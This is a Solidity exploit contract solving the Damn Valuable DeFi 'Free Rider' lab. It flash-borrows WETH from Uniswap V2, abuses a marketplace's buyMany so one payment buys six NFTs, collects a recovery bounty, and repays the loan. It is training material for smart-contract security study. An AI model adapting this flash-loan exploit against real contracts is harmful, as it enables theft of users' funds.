// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "../DamnValuableToken.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderFlashSwapper is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public pair;
    IUniswapV2Factory public factory;
    DamnValuableNFT public nft;
    IWETH public weth;
    FreeRiderNFTMarketplace public market;
    FreeRiderRecovery public recovery;

    constructor(address _pair, address _market, address _recovery) {
        pair = IUniswapV2Pair(_pair);
        factory = IUniswapV2Factory(pair.factory());
        weth = IWETH(pair.token0());
        market = FreeRiderNFTMarketplace(payable(_market));
        nft = market.token();
        recovery = FreeRiderRecovery(_recovery);
    }

    function flashSwap() external {
        // Store the amount of WETH repayment needed to complete swap
        uint amount = 20 ether;
        uint repay = (amount * 1004) / 1000;
        bytes memory data = abi.encode(repay);
        // Make the swap, passing along the repayment amount
        pair.swap(amount, 0, address(this), data);
        selfdestruct(payable(msg.sender));
    }

    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender == IUniswapV2Factory(factory).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair

        // Unwrap the WETH received from Uniswap
        weth.withdraw(15 ether);
        require(address(this).balance >= 15 ether, "Failed to withdraw 15 ETH");

        // Exploit the market contract
        uint[] memory tokenIds = new uint[](6);
        for (uint i = 1; i < 6; i++) {
            tokenIds[i] = i;
        }
        market.buyMany{value: 15 ether}(tokenIds);
        for (uint i = 0; i < 6; i++) {
            require(nft.ownerOf(i) == address(this), "Failed to buy all NFTs");
        }

        // Transfer the NFTs to the recovery contract
        bytes memory _data = abi.encode(address(this));
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, _data);
        }
        require(address(this).balance >= 45 ether, "Failed to receive prize");

        // Repay Uniswap pair
        uint repay = abi.decode(data, (uint256));
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
